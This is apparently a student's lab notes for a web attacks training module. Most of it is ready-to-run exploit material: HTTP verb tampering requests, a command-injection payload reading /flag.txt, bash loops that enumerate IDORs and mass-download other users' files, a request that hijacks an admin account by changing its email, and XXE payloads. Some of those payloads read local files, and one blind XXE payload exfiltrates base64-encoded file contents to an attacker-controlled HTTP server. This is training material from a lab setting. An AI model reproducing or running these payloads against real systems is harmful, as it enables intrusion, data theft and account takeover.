# Bypassing Basic Authentication


```bash
DELETE /admin/reset.php? HTTP/1.1
Host: 94.237.59.174:37363
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.59.174:37363/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


Steps:
1. change GET to POST and next to HEAD,DELETE,Patch,Options

```


# Bypassing Security Filters

```bash
curl -i -X HTTP_Verb_Tampering http://SERVER_IP:PORT/
POST /index.php HTTP/1.1
Host: 94.237.59.174:37363
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

filename=file1;%20cat%20/flag.txt;

Steps:
1. change GET to POST

```

# Mass IDOR Enumeration

## GET 

```bash

#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done

```


## POST
### Soluction

```bash

#!/bin/bash

url="http://94.237.54.176:47463"

for i in {1..20}; do
    echo "Fetching: $url/documents.php"
    response=$(curl -s -X POST -d "uid=$i" "$url/documents.php")
    echo "Response received for UID $i:"
    echo "$response" 

    for link in $(echo "$response" | grep -oP "\/documents.*?.txt"); do
        echo "Found link: $url$link"
        wget -q "$url$link"
    done
done

```

# Bypassing Encoded References

```bash
for i in {1..20}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

```

## GET
## soluction

```bash

#!/bin/bash

for i in {1..20}; do
    hash=$(echo -n $i | base64 )
    url="http://94.237.63.201:42092/download.php?contract=$hash"
    echo "Fetching: $url"
    response= $(curl -sOJ -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "$url")
    echo "$response"
done

cat *pdf

```


## POST

```bash

#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://94.237.54.176:47463/download.php
    done
done


```



# IDOR in Insecure APIs

Steps:
1. find how the app work and find in the middle the call to api is call the profile info

``` bash

GET /profile/api.php/profile/5 HTTP/1.1
Host: 94.237.63.201:42092
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.63.201:42092/profile/index.php
Connection: keep-alive
Cookie: role=employee


```



# Chaining IDOR Vulnerabilities

Steps: 
1. LEAK all uuid to find the admin
2. Get uuid the admin and change the email

```bash

#!/bin/bash

for i in {1..20}; do
    url="http://94.237.63.201:42092/profile/api.php/profile/$i"
    response=$(curl  -s $url)
    echo "$response"
done


```

change email

```bash

PUT /profile/api.php/profile/10 HTTP/1.1
Host: 94.237.63.201:42092
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.63.201:42092/profile/index.php
Content-type: application/json
Content-Length: 175
Origin: http://94.237.63.201:42092
Connection: keep-alive
Cookie: role=employee

{"uid":10,"uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":"I don't like quoting others!"}

```

# Local File Disclosure


Steps:
1.Entity have to be the same with email in DOCTYPE
2.not in this exercise but maybe sametimes you have to, if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml
3.

```bash

POST /submitDetails.php HTTP/1.1
Host: 10.129.207.224
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 246
Origin: http://10.129.207.224
Connection: keep-alive
Referer: http://10.129.207.224/

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">]>
<root>
<name>admin</name>
<tel></tel>
<email>&company;</email>
<message>memory</message>
</root>

```


# advanced File Disclosure

Steps:
1. set xml payload
2. set the file xxe.dtd
3. set the email to &joined
4. set a server http
5. send the payload and change the email

file xxe.dtd

```bash
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd

```
Request

```bash 
POST /submitDetails.php HTTP/1.1
Host: 10.129.207.224
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 327
Origin: http://10.129.207.224
Connection: keep-alive
Referer: http://10.129.207.224/

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://10.10.14.57:8000/xxe.dtd">
  %xxe;
]>
<root>
<name>gfcgv</name>
<tel></tel>
<email>&joined;</email>
<message>sdv</message>
</root>


```


# Blind Data Exfiltrate

Steps:
1. Set the file xxe.dtd
2. set python http.server
3. Set the payload in request
4. decode the base64 to see the flag

1. 
```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.57:8000/?content=%file;'>">

```
2. 
```bash
python3 -m http.server

```

3. 
```bash
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.207.224
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 242
Origin: http://10.129.207.224
Connection: keep-alive
Referer: http://10.129.207.224/blind/

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.57:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>
<name>admin</name>
<tel></tel>
<email>&content;</email>
<message>sdaca</message>
</root>

```


# Web Attacks - Skills Assesment





```bash 

HEAD /reset.php HTTP/1.1
Host: 94.237.54.176:36212
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.54.176:36212/settings.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Origin: http://94.237.54.176:36212
Connection: keep-alive
Cookie: PHPSESSID=7dt378u4935c654a4usfp9d8oi; uid=1

uid=1&token=e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c&password=123456

```